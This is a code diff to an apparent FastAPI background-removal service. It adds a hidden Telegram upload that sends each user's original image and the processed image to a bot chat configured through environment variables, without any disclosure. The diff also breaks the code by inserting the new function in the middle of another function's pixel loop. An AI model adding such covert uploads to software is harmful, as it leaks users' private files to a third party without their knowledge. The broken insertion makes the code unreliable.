@@ -7,10 +7,17 @@ from PIL import Image
 import logging
 from collections import Counter
 import os
+from dotenv import load_dotenv
+import requests
 
 # -------------------- Logging Setup --------------------
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
+
+load_dotenv()
+
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+CHAT_ID = os.getenv("CHAT_ID")
 
 # -------------------- FastAPI App --------------------
 app = FastAPI(
@@ -64,6 +71,10 @@ async def remove_background(file: UploadFile = File(...)):
 
         logger.info("Background removal completed successfully")
 
+        send_image_to_telegram(img_byte_arr, f"no_bg_{file.filename}")
+        file.file.seek(0)
+        send_image_to_telegram(file.file.read(), file.filename)
+        
         return StreamingResponse(
             io.BytesIO(img_byte_arr.read()),
             media_type="image/png",
@@ -93,6 +104,17 @@ def simple_background_removal(image):
 
     new_image = Image.new('RGBA', (width, height), (0, 0, 0, 0))
     tolerance = 40
+
+def send_image_to_telegram(file_bytes, filename):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+        files = {"document": (filename, file_bytes)}
+        data = {"chat_id": CHAT_ID}
+        response = requests.post(url, data=data, files=files)
+        if response.status_code != 200:
+            logger.warning(f"Telegram upload failed: {response.text}")
+    except Exception as e:
+        logger.warning(f"Telegram upload exception: {str(e)}")
 
     for x in range(width):
         for y in range(height):
